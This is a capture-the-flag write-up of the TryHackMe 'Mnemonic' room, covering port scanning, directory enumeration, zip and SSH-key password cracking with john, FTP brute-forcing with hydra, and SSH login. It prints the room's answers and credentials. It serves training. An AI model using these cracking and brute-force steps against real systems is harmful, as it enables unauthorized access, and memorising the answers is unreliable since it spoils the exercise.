May 10, 2025<br>
Day 369<br>

![image](https://github.com/user-attachments/assets/b9685fff-7fb0-4c80-bc24-0057ea686289)


<h1>Mnemonic</h1>

https://tryhackme.com/room/mnemonic<br>

<br>
<br>

![image](https://github.com/user-attachments/assets/b3d9f441-f92c-4d5c-b68e-2d5d25456004)

<br>
<br>

<h2>Task 1 . Mnemonic</h2>

<h3>Hit me!</h3>
<p>You need 1 things : hurry up<br>
https://www.youtube.com/watch?v=pBSR3DyobIY</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 1.1. <em>-</em><a id='1.1'></a>
>> <code><strong>No answer needed</strong></code><br>

<br>
<br>

<h2>Task 2 . Enumerate</h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 2.1. <em>How many open ports?</em><a id='2.1'></a>
>> <code><strong>3</strong></code><br>


<br>

> 2.2. <em>what is the ssh port number?</em><a id='2.2'></a>
>> <code><strong>1337</strong></code><br>

<br>


<h3 align="center">$$\textcolor{white}{\textnormal{Nmap}}$$</h3>

<p align="center">There are have 3 ports open: <code>21/ftp</code>, <code>80/http</code> and <code>1337/ssh</code>. </p>

```bash
nmap -sC -sV -Pn -p- -T4 TargetIP
...
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/webmasters/*
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html)
1337/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
```

<br>
<br>

> 2.3. <em>what is the name of the secret file?</em><a id='2.3'></a>
>> <code><strong>backups.zip</strong></code><br>

<br>



<h3 align="center">$$\textcolor{white}{\textnormal{http://TargetIP}}$$</h3>
<p align="center"><code>Test</code></p>


![image](https://github.com/user-attachments/assets/9cf02354-efcf-430e-9edd-15a53962d9cd)

<br>

<h3 align="center">$$\textcolor{white}{\textnormal{http://TargetIP/robots.txt}}$$</h3>
<p align="center"><code>Dissalow: /webmasters/*</code></p>


![image](https://github.com/user-attachments/assets/a58d7b7e-5495-4542-abb5-55ac60c0a747)

<br>

<h3 align="center">$$\textcolor{white}{\textnormal{Gobuster x http://TargetIP/webmasters/}}$$</h3>
<p align="center"><code>/admin/</code> and <code>/backups/</code></p>

<br>

```bash
:~# gobuster dir -u http://TargetIP/webmasters/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 403 -t 100
...
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin/               (Status: 200) [Size: 0]
/backups/             (Status: 200) [Size: 0]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```


<br>

<h3 align="center">$$\textcolor{white}{\textnormal{Gobuster x http://TargetIP/webmasters/backups/}}$$</h3>
<p align="center"><code>backups.zip</code> and <code>index.html</code></p>

<br>

```bash
:~# gobuster dir -u http://TargetIP/webmasters/backups/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,html,zip,tar,gz,back.old,js,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TargetIP/webmasters/backups/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              back.old,js,txt,php,html,zip,tar,gz
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
...
/backups.zip          (Status: 200) [Size: 409]
/index.html           (Status: 200) [Size: 0]
...
```

<br>
<br>

<h2>Task 3 . Credentials</h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 3.1. <em>ftp user name?</em><a id='3.1'></a>
>> <code><strong>ftpuser</strong></code><br>

<br>

<br>

<h3 align="center">$$\textcolor{white}{\textnormal{http://TargetIP/webmasters/backups/backups.zip}}$$</h3>
<p align="center"><code>backups.zip</code> downloaded</p>



![image](https://github.com/user-attachments/assets/e4cdd597-d5f3-4635-87a5-4fe269bfc372)

<br>

<h3 align="center">$$\textcolor{white}{\textnormal{zip2john X backups.zip }}$$</h3>
<p align="center"><code>hash</code></p>

<br>


```bash
:~# file backups.zip
backups.zip: Zip archive data, at least v1.0 to extract
:~# unzip backups.zip
Archive:  backups.zip
   creating: backups/
[backups.zip] backups/note.txt password:
...
:~# zip2john backups.zip > hash
ver 1.0 backups.zip/backups/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backups.zip/backups/note.txt PKZIP Encr: 2b chk, TS_chk, cmplen=67, decmplen=60, crc=AEE718A8 type=8
:~# cat hash
backups.zip/backups/note.txt:$pkzip2$1*2*2*0*43*3c*aee718a8*42*4a*8*43*aee7*24e2*2918f93964f9ffa39d4a5fc0d589cae4222fd228a12bc6459bf7b383bdc3cd74557af7a16783ba3217388d2db639162dcee0456f5264bb1839b0f63a28de19581bda79*$/pkzip2$:backups/note.txt:backups.zip::backups.zip
```

<br>

<h3 align="center">$$\textcolor{white}{\textnormal{john X hash }}$$</h3>
<p align="center"><code>00385007</code> --> <code>note.txt</code></p>

<br>

```bash
:~# john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
00385007         (backups.zip/backups/note.txt)
...
Session completed. 
:~# unzip backups.zip
Archive:  backups.zip
   creating: backups/
[backups.zip] backups/note.txt password: 
  inflating: backups/note.txt
:~# cd backups
:~/backups# ls
note.txt
```

<br>

<h3 align="center">$$\textcolor{white}{\textnormal{cat X note.txt }}$$</h3>
<p align="center"><code>ftp username</code> : <code>ftpuser</code></p>

<br>

```bash
:~/backups# cat note.txt
@vill

James new ftp username: ftpuser
we have to work hard
:~/backups# 
```

<br>
<br>

> 3.2. <em>ftp password?</em><a id='3.2'></a>
>> <code><strong>love4ever</strong></code><br>

<br>

<br>

<h3 align="center">$$\textcolor{white}{\textnormal{hydra x ftpuser}}$$</h3>
<p align="center"><code>ftpuser</code> : <code>love4ever</code></p>

<br>

```bash
:~/backups# hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://TargetIP
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-10 03:05:56
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://TargetIP:21/
[STATUS] 222.00 tries/min, 222 tries in 00:01h, 14344176 to do in 1076:54h, 16 active
[STATUS] 250.33 tries/min, 751 tries in 00:03h, 14343647 to do in 954:59h, 16 active
[21][ftp] host: TargetIP   login: ftpuser   password: love4ever
1 of 1 target successfully completed, 1 valid password found
...
```

<br>
<br>

> 3.3. <em>What is the ssh username?</em><a id='3.3'></a>
>> <code><strong>james</strong></code><br>

<br>
<br>

> 3.4. <em>What is the ssh password?</em><a id='3.4'></a>
>> <code><strong>bluelove</strong></code><br>

<br>
<br>


<h3 align="center">$$\textcolor{white}{\textnormal{ftp --> ftpuser : love4ever}}$$</h3>
<p align="center"><code>ftpuser</code> : <code>love4ever</code></p>

<br>

```bash
~/Mnemonic# ftp TargetIP
Connected to TargetIP
...
Name (TargetIP:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------   12 1003     1003         4096 Jul 14  2020 .
drwx------   12 1003     1003         4096 Jul 14  2020 ..
lrwxrwxrwx    1 1003     1003            9 Jul 14  2020 .bash_history -> /dev/null
-rw-r--r--    1 1003     1003          220 Jul 13  2020 .bash_logout
-rw-r--r--    1 1003     1003         3771 Jul 13  2020 .bashrc
-rw-r--r--    1 1003     1003          807 Jul 13  2020 .profile
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
drwxr-xr-x    4 0        0            4096 Jul 14  2020 data-4
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
226 Directory send OK.
ftp> cd data-4
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    4 0        0            4096 Jul 14  2020 .
drwx------   12 1003     1003         4096 Jul 14  2020 ..
drwxr-xr-x    2 0        0            4096 Jul 14  2020 3
drwxr-xr-x    2 0        0            4096 Jul 14  2020 4
-rwxr-xr-x    1 1001     1001         1766 Jul 13  2020 id_rsa
-rwxr-xr-x    1 1000     1000           31 Jul 13  2020 not.txt
226 Directory send OK.
ftp> get not.txt
local: not.txt remote: not.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for not.txt (31 bytes).
226 Transfer complete.
31 bytes received in 0.01 secs (5.0897 kB/s)
ftp> get id_rsa
local: id_rsa remote: id_rsa
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_rsa (1766 bytes).
226 Transfer complete.
1766 bytes received in 0.00 secs (2.1211 MB/s)
ftp> exit

...

root@ip-10-10-26-50:~/Mnemonic# cat not.txt
james change ftp user password
root@ip-10-10-26-50:~/Mnemonic# chmod +x id_rsa
root@ip-10-10-26-50:~/Mnemonic# ls
backups.zip  id_rsa  not.txt
root@ip-10-10-26-50:~/Mnemonic# ssh -p 1337 -i id_rsa james@10.10.229.90
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0755 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
james@10.10.229.90's password:

...

:~/Mnemonic# locate ssh2john
/opt/john/ssh2john.py
root@ip-10-10-26-50:~/Mnemonic# python2 /opt/john/ssh2john.py id_rsa > hash
root@ip-10-10-26-50:~/Mnemonic# ls
backups.zip  hash  id_rsa  not.txt
root@ip-10-10-26-50:~/Mnemonic# john --worddlist=/usr/share/wordlists/rockyou.txt hash
Unknown option: "--worddlist=/usr/share/wordlists/rockyou.txt"
root@ip-10-10-26-50:~/Mnemonic# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bluelove         (id_rsa)
1g 0:00:00:10 DONE (2025-05-10 23:11) 0.09842g/s 1411Kp/s 1411Kc/s 1411KC/s *7¡Vamos!
Session completed. 
root@ip-10-10-26-50:~/Mnemonic# 

...

:~/Mnemonic# ssh -p 1337 james@10.10.229.90
james@10.10.229.90's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat May 10 22:17:53 UTC 2025

  System load:  0.08               Processes:           94
  Usage of /:   34.0% of 12.01GB   Users logged in:     0
  Memory usage: 16%                IP address for eth0: 10.10.229.90
  Swap usage:   0%

  => There is 1 zombie process.


51 packages can be updated.
0 updates are security updates.


Last login: Thu Jul 23 20:40:09 2020 from 192.168.1.5

james@mnemonic:~$ pwd
/home/james
james@mnemonic:~$ ls -la
total 44
drwx------  6 james james 4096 Jul 14  2020 .
drwxr-xr-x 10 root  root  4096 Jul 14  2020 ..
-rw-r--r--  1 vill  vill   116 Jul 14  2020 6450.txt
lrwxrwxrwx  1 james james    9 Jul 14  2020 .bash_history -> /dev/null
-rw-r--r--  1 james james  220 Jul 13  2020 .bash_logout
-rw-r--r--  1 james james 3771 Jul 13  2020 .bashrc
drwx------  2 james james 4096 Jul 13  2020 .cache
drwx------  3 james james 4096 Jul 13  2020 .gnupg
drwxrwxr-x  3 james james 4096 Jul 13  2020 .local
-rw-r--r--  1 vill  vill   155 Jul 13  2020 noteforjames.txt
-rw-r--r--  1 james james  807 Jul 13  2020 .profile
drwx------  2 james james 4096 Jul 13  2020 .ssh
james@mnemonic:~$ cat 6450.txt
5140656
354528
842004
1617534
465318
1617534
509634
1152216
753372
265896
265896
15355494
24617538
3567438
15355494
james@mnemonic:~$ cat noteforjames.txt
noteforjames.txt

@vill

james i found a new encryption \u0130mage based name is Mnemonic  

I created the condor password. don't forget the beers on saturday
                                                                               
Broadcast message from root@mnemonic (somewhere) (Sat May 10 22:18:20 2025):   
                                                                               
     IPS/IDS SYSTEM ON !!!!                                                    
 **     *     ****  **                                                         
         * **      *  * *                                                      
*   ****                 **                                                    
 *                                                                             
    * *            *                                                           
       *                  *                                                    
         *               *                                                     
        *   *       **                                                         
* *        *            *                                                      
              ****    *                                                        
     *        ****                                                             
                                                                               
 Unauthorized access was detected.                         
james@mnemonic:~$ ls -la
total 44
drwx------  6 james james 4096 Jul 14  2020 .
drwxr-xr-x 10 root  root  4096 Jul 14  2020 ..
-rw-r--r--  1 vill  vill   116 Jul 14  2020 6450.txt
lrwxrwxrwx  1 james james    9 Jul 14  2020 .bash_history -> /dev/null
-rw-r--r--  1 james james  220 Jul 13  2020 .bash_logout
-rw-r--r--  1 james james 3771 Jul 13  2020 .bashrc
drwx------  2 james james 4096 Jul 13  2020 .cache
drwx------  3 james james 4096 Jul 13  2020 .gnupg
drwxrwxr-x  3 james james 4096 Jul 13  2020 .local
-rw-r--r--  1 vill  vill   155 Jul 13  2020 noteforjames.txt
-rw-r--r--  1 james james  807 Jul 13  2020 .profile
drwx------  2 james james 4096 Jul 13  2020 .ssh
james@mnemonic:~$ 



```

<br>
<br>



<br>

![image](https://github.com/user-attachments/assets/ce4e1871-0064-49af-aaa9-848b7ad501d2)

<br>

![image](https://github.com/user-attachments/assets/2e5435f8-7fa6-462d-9ad0-0d8a88512e47)

<br>

![image](https://github.com/user-attachments/assets/7eb9ffbe-0965-4537-8cd0-fe19aa989463)

<br>

![image](https://github.com/user-attachments/assets/acff34b3-5d1f-476e-9d38-fe1cb25bc09f)

<br>

![image](https://github.com/user-attachments/assets/6e3bcec3-8df8-427e-84eb-6309755f7700)

<br>

![image](https://github.com/user-attachments/assets/835ee8f7-4d44-44dc-82b1-36528e599d6d)







